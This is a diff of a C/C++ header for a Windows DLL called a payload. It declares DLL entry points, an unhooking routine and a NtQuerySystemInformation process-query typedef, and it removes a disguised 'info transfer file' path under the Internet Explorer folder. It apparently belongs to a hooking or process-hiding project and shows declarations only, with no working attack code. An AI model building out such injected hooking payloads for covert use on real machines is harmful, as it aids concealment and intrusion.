@@ -1,26 +1,31 @@
 #ifndef PAYLOAD_H
 #define PAYLOAD_H
-
+#include <Windows.h>
+#include <winternl.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <Psapi.h>
 #include <math.h>
-#include <Windows.h>
-#include <winternl.h>
-#define INFO_TRANSFER_FILE "C:\\Program Files\\Internet Explorer\\mdsint.isf"
+
+#include "../Common/ArgumentsPassing.h"
+
 #define MAX_LINE 500
 #define MAX_COMMAND 100
-#define DEBUG_MODE
 
-void InitializeDLL();
+//#define DEBUG_MODE
 
+void InitializeDLL(pArgStruct args);
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved);
 extern HANDLE hMutex;
 extern bool isUp;
 extern "C" __declspec(dllexport) wchar_t* WStringFunc();
 
 extern "C" __declspec(dllexport) char* StringFunc();
 extern "C" __declspec(dllexport) void VoidFunc();
-//void PrintToFile(const char* s);
+
+#ifdef DEBUG_MODE
+void PrintToFile(const char* s);
+#endif
 void UnhookDLL();
 typedef NTSTATUS(__stdcall *PNtQueryFunc)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 typedef struct _SYSTEM_PROCESS_INFO
